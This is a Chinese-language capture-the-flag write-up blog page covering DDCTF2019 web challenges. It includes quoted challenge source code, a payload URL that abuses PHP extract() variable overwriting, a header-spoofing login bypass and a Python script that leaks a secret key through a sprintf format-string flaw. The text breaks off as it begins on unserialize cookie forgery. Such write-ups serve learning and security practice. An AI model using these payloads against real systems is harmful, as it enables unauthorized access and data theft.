<p>reference:<br><a href="https://cr0wn.uk/2019/plaid-triggered/" target="_blank" rel="noopener">https://cr0wn.uk/2019/plaid-triggered/</a><br><a href="https://blog.wonderkun.cc/2019/04/15/plaidCTF%E4%B8%A4%E9%81%93web%E9%A2%98%E7%9B%AEwriteup/#more" target="_blank" rel="noopener">https://blog.wonderkun.cc/2019/04/15/plaidCTF%E4%B8%A4%E9%81%93web%E9%A2%98%E7%9B%AEwriteup/#more</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/ctf/">ctf</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2019/04/21/CTF/ddctf2019/"><span>DDCTF2019</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2019/04/21/CTF/ddctf2019/" rel="bookmark">
        <time class="entry-date published" datetime="2019-04-21T12:17:52.512Z">
          2019-04-21
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="DDCTF2019"><a href="#DDCTF2019" class="headerlink" title="DDCTF2019"></a>DDCTF2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p>还是要有耐心啊，这次做题由于感觉像吃了屎一样，所以索性就没做了，并且精力有限。</p>
<p>这题打开链接，给出了一张图片（这图成功成为了又一个表情包）<br><img src="https://i.imgur.com/wN3YSTR.jpg" alt=""><br>注意地址栏，参数<strong>jpg</strong>后面跟了一串字符串，猜测base64，经过一番尝试，发现编码规则是将源文件名转为hex，再进行两次base64编码，于是尝试读取源码</p>
<p>利用python进行编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(base64.b64encode(base64.b64encode((&apos;index.php&apos;.encode(&apos;ascii&apos;)).hex().encode(&apos;utf-8&apos;))),&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure></p>
<p>拿到源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> */</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));</span><br><span class="line">echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>注释中有一个博客地址，进入博客，查看历史文章，在这篇文章：<br><a href="https://blog.csdn.net/FengBanLiuYun/article/details/80913909" target="_blank" rel="noopener">https://blog.csdn.net/FengBanLiuYun/article/details/80913909</a><br>找到一个：<strong>.practice.txt.swp</strong>，尝试将其作为一个文件粘贴入地址栏，得到了：<strong>f1ag!ddctf.php</strong><br>猜测flag就在这，但注意到源码中将<strong>config</strong>置换为<strong>!</strong>，且直接输入<strong>f1ag!ddctf.php</strong>会将<strong>!</strong>换为空字符，于是有了如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(base64.b64encode(base64.b64encode((&apos;f1agconfigddctf.php&apos;.encode(&apos;ascii&apos;)).hex().encode(&apos;utf-8&apos;))),&apos;utf-8&apos;)</span><br></pre></td></tr></table></figure>
<p>得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">$k = &apos;hello&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    if($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;hello&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>变量覆盖漏洞</strong><br>trim()</p>
<blockquote>
<p>trim() 函数移除字符串两侧的空白字符或其他预定义字符。</p>
</blockquote>
<p>extract()</p>
<blockquote>
<p>extract() 函数从数组中将变量导入到当前的符号表。</p>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p>
<p>第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p>
<p>该函数返回成功导入到符号表中的变量数目。</p>
</blockquote>
<p>paylaod:<code>http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=1</code><br><strong>DDCTF{436f6e67726174756c6174696f6e73}</strong></p>
<h3 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h3><p>进入链接后，注意到一行大字：<br><strong>抱歉，您没有登陆权限，请获取权限后访问—–</strong><br>查看源码，注意到<code>&lt;script type=&quot;text/javascript&quot; src=&quot;js/index.js&quot;&gt;&lt;/script&gt;</code>，查看源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: didi</span><br><span class="line"> * Date: 2019/1/13</span><br><span class="line"> * Time: 9:05 PM</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">function auth() &#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: &quot;post&quot;,</span><br><span class="line">        url:&quot;http://117.51.158.44/app/Auth.php&quot;,</span><br><span class="line">        contentType: &quot;application/json;charset=utf-8&quot;,</span><br><span class="line">        dataType: &quot;json&quot;,</span><br><span class="line">        beforeSend: function (XMLHttpRequest) &#123;</span><br><span class="line">            XMLHttpRequest.setRequestHeader(&quot;didictf_username&quot;, &quot;&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: function (getdata) &#123;</span><br><span class="line">           console.log(getdata);</span><br><span class="line">           if(getdata.data !== &apos;&apos;) &#123;</span><br><span class="line">               document.getElementById(&apos;auth&apos;).innerHTML = getdata.data;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;,error:function(error)&#123;</span><br><span class="line">            console.log(error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以思路比较清楚，向<code>http://117.51.158.44/app/Auth.php</code>发送认证，于是添加header：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">didictf_username: admin</span><br></pre></td></tr></table></figure></p>
<p>得到如下提示：<br><strong>您当前当前权限为管理员—-请访问:app/fL2XID2i0Cdh.php</strong><br>访问<br><strong>app/Application.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">Class Application &#123;</span><br><span class="line">    var $path = &apos;&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function response($data, $errMsg = &apos;success&apos;) &#123;</span><br><span class="line">        $ret = [&apos;errMsg&apos; =&gt; $errMsg,</span><br><span class="line">            &apos;data&apos; =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(&apos;Content-type: application/json&apos;);</span><br><span class="line">        echo $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function auth() &#123;</span><br><span class="line">        $DIDICTF_ADMIN = &apos;admin&apos;;</span><br><span class="line">        if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            $this-&gt;response(&apos;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&apos;);</span><br><span class="line">            return TRUE;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;response(&apos;抱歉，您没有登陆权限，请获取权限后访问-----&apos;,&apos;error&apos;);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    private function sanitizepath($path) &#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);</span><br><span class="line">    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">    if(empty($this-&gt;path)) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $path = $this-&gt;sanitizepath($this-&gt;path);</span><br><span class="line">        if(strlen($path) !== 18) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>app/Session.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">include &apos;Application.php&apos;;</span><br><span class="line">class Session extends Application &#123;</span><br><span class="line"></span><br><span class="line">    //key建议为8位字符串</span><br><span class="line">    var $eancrykey                  = &apos;&apos;;</span><br><span class="line">    var $cookie_expiration			= 7200;</span><br><span class="line">    var $cookie_name                = &apos;ddctf_id&apos;;</span><br><span class="line">    var $cookie_path				= &apos;&apos;;</span><br><span class="line">    var $cookie_domain				= &apos;&apos;;</span><br><span class="line">    var $cookie_secure				= FALSE;</span><br><span class="line">    var $activity                   = &quot;DiDiCTF&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">	if(parent::auth()) &#123;</span><br><span class="line">            $this-&gt;get_key();</span><br><span class="line">            if($this-&gt;session_read()) &#123;</span><br><span class="line">                $data = &apos;DiDI Welcome you %s&apos;;</span><br><span class="line">                $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);</span><br><span class="line">                parent::response($data,&apos;sucess&apos;);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $this-&gt;session_create();</span><br><span class="line">                $data = &apos;DiDI Welcome you&apos;;</span><br><span class="line">                parent::response($data,&apos;sucess&apos;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function get_key() &#123;</span><br><span class="line">        //eancrykey  and flag under the folder</span><br><span class="line">        $this-&gt;eancrykey =  file_get_contents(&apos;../config/key.txt&apos;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function session_read() &#123;</span><br><span class="line">        if(empty($_COOKIE)) &#123;</span><br><span class="line">        return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[$this-&gt;cookie_name];</span><br><span class="line">        if(!isset($session)) &#123;</span><br><span class="line">            parent::response(&quot;session not found&quot;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)-32);</span><br><span class="line">        $session = substr($session,0,strlen($session)-32);</span><br><span class="line"></span><br><span class="line">        if($hash !== md5($this-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        if(!is_array($session) OR !isset($session[&apos;session_id&apos;]) OR !isset($session[&apos;ip_address&apos;]) OR !isset($session[&apos;user_agent&apos;]))&#123;</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!empty($_POST[&quot;nickname&quot;])) &#123;</span><br><span class="line">            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);</span><br><span class="line">            $data = &quot;Welcome my friend %s&quot;;</span><br><span class="line">            foreach ($arr as $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            parent::response($data,&quot;Welcome&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($session[&apos;ip_address&apos;] != $_SERVER[&apos;REMOTE_ADDR&apos;]) &#123;</span><br><span class="line">            parent::response(&apos;the ip addree not match&apos;.&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        if($session[&apos;user_agent&apos;] != $_SERVER[&apos;HTTP_USER_AGENT&apos;]) &#123;</span><br><span class="line">            parent::response(&apos;the user agent not match&apos;,&apos;error&apos;);</span><br><span class="line">            return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">        return TRUE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private function session_create() &#123;</span><br><span class="line">        $sessionid = &apos;&apos;;</span><br><span class="line">        while(strlen($sessionid) &lt; 32) &#123;</span><br><span class="line">            $sessionid .= mt_rand(0,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = array(</span><br><span class="line">            &apos;session_id&apos; =&gt; md5(uniqid($sessionid,TRUE)),</span><br><span class="line">            &apos;ip_address&apos; =&gt; $_SERVER[&apos;REMOTE_ADDR&apos;],</span><br><span class="line">            &apos;user_agent&apos; =&gt; $_SERVER[&apos;HTTP_USER_AGENT&apos;],</span><br><span class="line">            &apos;user_data&apos; =&gt; &apos;&apos;,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5($this-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = $this-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            $this-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            $this-&gt;cookie_path,</span><br><span class="line">            $this-&gt;cookie_domain,</span><br><span class="line">            $this-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = new Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure></p>
<p>用burpsuite查看请求与响应情况：<br><strong>request:</strong></p>
<blockquote>
<p>POST /app/Session.php HTTP/1.1<br>Host: 117.51.158.44<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 12<br>didictf_username: admin</p>
<p>nickname=123</p>
</blockquote>
<p><strong>response:</strong></p>
<blockquote>
<p>HTTP/1.1 200 OK<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Thu, 18 Apr 2019 10:19:23 GMT<br>Content-Type: application/json<br>Connection: close<br>Set-Cookie: ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%224b42d9a8f4e766b08ca9125762bf0d45%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22101.207.121.38%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A78%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D38af5d35992029e7901a61356d1f4609; expires=Thu, 18-Apr-2019 12:19:23 GMT; Max-Age=7200<br>Content-Length: 188</p>
<p>{“errMsg”:”success”,”data”:”\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458—-\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php”}{“errMsg”:”sucess”,”data”:”DiDI Welcome you %s”}</p>
</blockquote>
<p>注意到<strong>Set-Cookie</strong>字段，urldecode后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:10:&quot;session_id&quot;;s:32:&quot;4b42d9a8f4e766b08ca9125762bf0d45&quot;;s:10:&quot;ip_address&quot;;s:14:&quot;101.207.121.38&quot;;s:10:&quot;user_agent&quot;;s:78:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0&quot;;s:9:&quot;user_data&quot;;s:0:&quot;&quot;;&#125;38af5d35992029e7901a61356d1f4609</span><br></pre></td></tr></table></figure></p>
<p>另外：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;errMsg&quot;:&quot;success&quot;,&quot;data&quot;:&quot;\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php&quot;&#125;&#123;&quot;errMsg&quot;:&quot;sucess&quot;,&quot;data&quot;:&quot;DiDI Welcome you %s&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>回到源码：</p>
<ul>
<li>在url:app/Application.php中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct() &#123;</span><br><span class="line">    if(empty($this-&gt;path)) &#123;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $path = $this-&gt;sanitizepath($this-&gt;path);</span><br><span class="line">        if(strlen($path) !== 18) &#123;</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">        $this-&gt;response($data=file_get_contents($path),&apos;Congratulations&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>明显意识到反序列化</p>
<ul>
<li>在url:app/Session.php中<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">&#123;</span><br><span class="line">if(parent::auth()) &#123;</span><br><span class="line">        $this-&gt;get_key();</span><br><span class="line">        if($this-&gt;session_read()) &#123;</span><br><span class="line">            $data = &apos;DiDI Welcome you %s&apos;;</span><br><span class="line">            $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);</span><br><span class="line">            parent::response($data,&apos;sucess&apos;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;session_create();</span><br><span class="line">            $data = &apos;DiDI Welcome you&apos;;</span><br><span class="line">            parent::response($data,&apos;sucess&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>进行session检查没有则创造一个session，所以访问时要设定session，往下看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public function index()</span><br><span class="line">&#123;</span><br><span class="line">if(parent::auth()) &#123;</span><br><span class="line">        $this-&gt;get_key();</span><br><span class="line">        if($this-&gt;session_read()) &#123;</span><br><span class="line">            $data = &apos;DiDI Welcome you %s&apos;;</span><br><span class="line">            $data = sprintf($data,$_SERVER[&apos;HTTP_USER_AGENT&apos;]);</span><br><span class="line">            parent::response($data,&apos;sucess&apos;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;session_create();</span><br><span class="line">            $data = &apos;DiDI Welcome you&apos;;</span><br><span class="line">            parent::response($data,&apos;sucess&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>sprinf</strong>存在格式化字符串漏洞，所以试图让他打印出<strong>key值</strong><br><a href="https://paper.seebug.org/386/#0x03-php" target="_blank" rel="noopener">sprintf漏洞</a><br>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">   import requests</span><br><span class="line">   </span><br><span class="line">   url = &apos;http://117.51.158.44/app/Session.php&apos;</span><br><span class="line">   </span><br><span class="line">   body = &#123;&apos;nickname&apos;:&apos;/%s&apos;&#125;</span><br><span class="line">   headers = &#123;&apos;didictf_username&apos;:&apos;admin&apos;&#125;</span><br><span class="line">   s = requests.Session()</span><br><span class="line">   </span><br><span class="line">   s.get(url=url,headers=headers)</span><br><span class="line">   response = s.post(url=url,headers=headers,data=body)</span><br><span class="line">   print(response.text)</span><br></pre></td></tr></table></figure></p>
<p>得到<code>key：EzblrbNS</code></p>
<ul>
<li>下一步就是序列化</li>
</ul>
<p>注意到这步：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if($hash !== md5($this-&gt;eancrykey.$session)) &#123;</span><br><span class="line">    parent::response(&quot;the cookie data not match&quot;,&apos;error&apos;);</span><br><span class="line">    return FALSE;</span><br><span class="line">&#125;</span><br><span class="line">$session = unserialize($session);</span><br></pre></td></tr></table></figure>
